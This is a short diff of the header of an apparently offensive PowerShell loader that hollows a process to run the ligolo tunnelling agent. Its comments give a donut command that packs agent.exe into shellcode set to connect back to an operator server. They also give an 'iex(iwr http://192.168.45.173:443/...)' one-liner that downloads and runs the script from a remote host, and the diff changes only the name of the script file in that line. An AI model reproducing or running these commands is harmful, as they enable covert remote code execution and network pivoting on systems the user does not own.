@@ -1,6 +1,6 @@
 #1 Make sure to convert agent.exe of ligolo to shellcode: donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
 #2 Make sure you are running as x64 bit process before running.
-#4 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-Hollow.ps1 -UseBasicParsing)
+#4 Invoke it: iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)
 
 # Step 1: Check if running as a 64-bit process
 if ([System.IntPtr]::Size -ne 8) {
